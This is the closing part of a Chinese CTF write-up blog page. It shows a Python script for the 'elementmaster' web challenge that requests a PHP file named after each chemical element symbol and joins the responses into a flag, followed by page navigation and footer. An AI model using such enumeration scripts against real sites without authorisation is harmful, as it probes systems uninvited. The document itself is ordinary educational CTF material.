class="string">'Al'</span>, <span class="string">'Si'</span>, <span class="string">'P'</span>, <span class="string">'S'</span>, <span class="string">'Cl'</span>, <span class="string">'Ar'</span>,</span><br><span class="line">                  <span class="string">'K'</span>, <span class="string">'Ca'</span>, <span class="string">'Sc'</span>, <span class="string">'Ti'</span>, <span class="string">'V'</span>, <span class="string">'Cr'</span>, <span class="string">'Mn'</span>, <span class="string">'Fe'</span>, <span class="string">'Co'</span>, <span class="string">'Ni'</span>, <span class="string">'Cu'</span>, <span class="string">'Zn'</span>, <span class="string">'Ga'</span>, <span class="string">'Ge'</span>, <span class="string">'As'</span>, <span class="string">'Se'</span>, <span class="string">'Br'</span>, </span><br><span class="line">                  <span class="string">'Kr'</span>, <span class="string">'Rb'</span>, <span class="string">'Sr'</span>, <span class="string">'Y'</span>, <span class="string">'Zr'</span>, <span class="string">'Nb'</span>, <span class="string">'Mo'</span>, <span class="string">'Te'</span>, <span class="string">'Ru'</span>, <span class="string">'Rh'</span>, <span class="string">'Pd'</span>, <span class="string">'Ag'</span>, <span class="string">'Cd'</span>, <span class="string">'In'</span>, <span class="string">'Sn'</span>, <span class="string">'Sb'</span>, <span class="string">'Te'</span>, </span><br><span class="line">                  <span class="string">'I'</span>, <span class="string">'Xe'</span>, <span class="string">'Cs'</span>, <span class="string">'Ba'</span>, <span class="string">'La'</span>, <span class="string">'Ce'</span>, <span class="string">'Pr'</span>, <span class="string">'Nd'</span>, <span class="string">'Pm'</span>, <span class="string">'Sm'</span>, <span class="string">'Eu'</span>, <span class="string">'Gd'</span>, <span class="string">'Tb'</span>, <span class="string">'Dy'</span>, <span class="string">'Ho'</span>, <span class="string">'Er'</span>, <span class="string">'Tm'</span>, </span><br><span class="line">                  <span class="string">'Yb'</span>, <span class="string">'Lu'</span>, <span class="string">'Hf'</span>, <span class="string">'Ta'</span>, <span class="string">'W'</span>, <span class="string">'Re'</span>, <span class="string">'Os'</span>, <span class="string">'Ir'</span>, <span class="string">'Pt'</span>, <span class="string">'Au'</span>, <span class="string">'Hg'</span>, <span class="string">'Tl'</span>, <span class="string">'Pb'</span>, <span class="string">'Bi'</span>, <span class="string">'Po'</span>, <span class="string">'At'</span>, <span class="string">'Rn'</span>, </span><br><span class="line">                  <span class="string">'Fr'</span>, <span class="string">'Ra'</span>, <span class="string">'Ac'</span>, <span class="string">'Th'</span>, <span class="string">'Pa'</span>, <span class="string">'U'</span>, <span class="string">'Np'</span>, <span class="string">'Pu'</span>, <span class="string">'Am'</span>, <span class="string">'Cm'</span>, <span class="string">'Bk'</span>, <span class="string">'Cf'</span>, <span class="string">'Es'</span>, <span class="string">'Fm'</span>,<span class="string">'Md'</span>, <span class="string">'No'</span>, <span class="string">'Lr'</span>,</span><br><span class="line">                  <span class="string">'Rf'</span>, <span class="string">'Db'</span>, <span class="string">'Sg'</span>, <span class="string">'Bh'</span>, <span class="string">'Hs'</span>, <span class="string">'Mt'</span>, <span class="string">'Ds'</span>, <span class="string">'Rg'</span>, <span class="string">'Cn'</span>, <span class="string">'Nh'</span>, <span class="string">'Fl'</span>, <span class="string">'Mc'</span>, <span class="string">'Lv'</span>, <span class="string">'Ts'</span>, <span class="string">'Og'</span>, <span class="string">'Uue'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> elements:</span><br><span class="line">	payload=url+i+<span class="string">".php"</span></span><br><span class="line">	r=requests.get(url=payload)</span><br><span class="line">	<span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">		flag+=r.text</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://dopamineblog.oss-accelerate.aliyuncs.com/img/20200326094058.png" alt></p>
+<p>跑出来是一个php，访问就得到了flag。</p>
+<p>先复现这几题吧，剩下的题目有些触及到我的知识盲区了…后面把相关知识补上后会再把这几题补上。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/writeup/" rel="tag"># writeup</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/03/13/协议层攻击之HTTP请求走私/" rel="next" title="协议层攻击之HTTP请求走私">
+                <i class="fa fa-chevron-left"></i> 协议层攻击之HTTP请求走私
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/头像.jpg" alt="D0pamine">
+            
+              <p class="site-author-name" itemprop="name">D0pamine</p>
+              <p class="site-description motion-element" itemprop="description">Always for you.</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#MISC"><span class="nav-number">1.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-最简单的misc"><span class="nav-number">1.1.</span> <span class="nav-text">1.最简单的misc</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-A-Beautiful-Picture"><span class="nav-number">1.2.</span> <span class="nav-text">2.A_Beautiful_Picture</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-小姐姐"><span class="nav-number">1.3.</span> <span class="nav-text">3.小姐姐</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-Real-EasyBaBa"><span class="nav-number">1.4.</span> <span class="nav-text">4.Real_EasyBaBa</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5-EasyBaBa"><span class="nav-number">1.5.</span> <span class="nav-text">5.EasyBaBa</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#6-圣火昭昭"><span class="nav-number">1.6.</span> <span class="nav-text">6.圣火昭昭</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#7-开场曲"><span class="nav-number">1.7.</span> <span class="nav-text">7.开场曲</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#8-TARGZ"><span class="nav-number">1.8.</span> <span class="nav-text">8.TARGZ</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Web"><span class="nav-number">2.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-fake-google"><span class="nav-number">2.1.</span> <span class="nav-text">1.fake google</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-old-hack"><span class="nav-number">2.2.</span> <span class="nav-text">2. old-hack</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-简单注入"><span class="nav-number">2.3.</span> <span class="nav-text">3.简单注入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-假猪套天下第一"><span class="nav-number">2.4.</span> <span class="nav-text">4.假猪套天下第一</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5-Schrödinger"><span class="nav-number">2.5.</span> <span class="nav-text">5.Schrödinger</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#6-elementmaster"><span class="nav-number">2.6.</span> <span class="nav-text">6.elementmaster</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">D0pamine</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
